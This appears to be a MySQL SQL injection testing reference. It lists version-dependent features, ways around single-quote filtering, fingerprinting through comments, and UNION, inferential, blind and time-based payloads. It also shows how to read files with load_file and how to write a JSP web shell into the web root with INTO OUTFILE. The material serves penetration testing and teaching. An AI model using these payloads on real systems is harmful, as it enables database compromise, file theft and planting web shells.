MySQL comes with at least four versions which are used in production worldwide, `3.23.x`, `4.0.x`, `4.1.x` and `5.0.x`. Every version has a set of features proportional to version number.
-   From Version 4.0: UNION
-   From Version 4.1: Subqueries
-   From Version 5.0: Stored procedures, Stored functions and the view named `INFORMATION_SCHEMA`
-   From Version 5.0.2: Triggers

It should be noted that for MySQL versions before 4.0.x, only Boolean or time-based Blind Injection attacks could be used, since the subquery functionality or `UNION` statements were not implemented.
## The Single Quotes Problem
 #### Bypass the need of single quotes
 Let’s suppose we want to know the value of a field named `password` in a record.
 1.  Password like `'A%'`
2.  The ASCII values in a concatenated hex: `password LIKE 0x4125`
3.  The char() function: `password LIKE CHAR(65,37)`

## Multiple Mixed Queries
MySQL library connectors do not support multiple queries separated by `;`
# Fingerprinting MySQL
When a comment block `'/**/'` contains an exclamation mark `'/*! sql here*/'` it is interpreted by MySQL.

Example:
```sql
1 /*! and 1=0 */
```
## Versions
using comment fingerprinting with a version number 
```sql
/*!40110 and 1=0*/
```
which means
```txt
if(version >= 4.1.10)
   add 'and 1=0' to the query.
```
***These are equivalent as the result is the same.***

**In band injection:**
```sql
1 AND 1=0 UNION SELECT @@version /*
```
**Inferential injection:**
```sql
1 AND @@version like '4.0%'
```
# Attack Vectors
If the connected user has `FILE` privileges and single quotes are not escaped, the `into outfile` clause can be used to export query results in a file.
```sql
Select * from table into outfile '/tmp/file'
```
> Note: there is no way to bypass single quotes surrounding a filename. So if there’s some sanitization on single quotes like escape `\'` there will be no way to use the `into outfile` clause.

#### Write a payload to a file
```sql
1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//'  LINES TERMINATED BY '\n<%jsp code here%>';
```

 - Results are stored in a file with `rw-rw-rw` privileges owned by MySQL user and group.
 -  Where `/var/www/root/test.jsp` will contain:
`//field values// ] <%jsp code here%>`

#### Read from a File
```sql
load_file('filename')
```

# Blind SQL Injection
-   String Length:
    -   `LENGTH(str)`
-   Extract a substring from a given string:
    -   `SUBSTRING(string, offset, #chars_returned)`
-   Time based Blind Injection:
    -   BENCHMARK and SLEEP `BENCHMARK(#ofcycles,action_to_be_performed)` The benchmark function could be used to perform timing attacks when blind injection by boolean values does not yield any results. See. `SLEEP()` (MySQL > 5.0.x) for an alternative on benchmark.
